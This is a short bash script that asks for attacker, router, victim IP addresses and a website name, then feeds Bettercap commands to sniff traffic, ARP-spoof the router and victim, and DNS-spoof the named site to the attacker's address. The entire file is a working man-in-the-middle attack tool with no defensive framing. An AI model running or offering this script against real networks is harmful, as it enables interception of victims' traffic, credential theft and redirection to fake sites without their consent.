#!/bin/bash

#!/bin/bash

read -p "Enter your IP address: " attacker_ip
read -p "Enter your Router IP address: " router_ip
read -p "Enter Victim IP address: " victum_ip
read -p "Enter redirect website name: " website





# Run Bettercap with sudo privileges
sudo bettercap <<EOF
# Commands to execute inside Bettercap
net.probe on
sleep 2
net.sniff on
sleep 2
set arp.spoof.targets $router_ip,$victum_ip
sleep 2
arp.spoof on
sleep 2
set dns.spoof.domains $website; set dns.spoof.address $attacker_ip
sleep 2
dns.spoof on
EOF
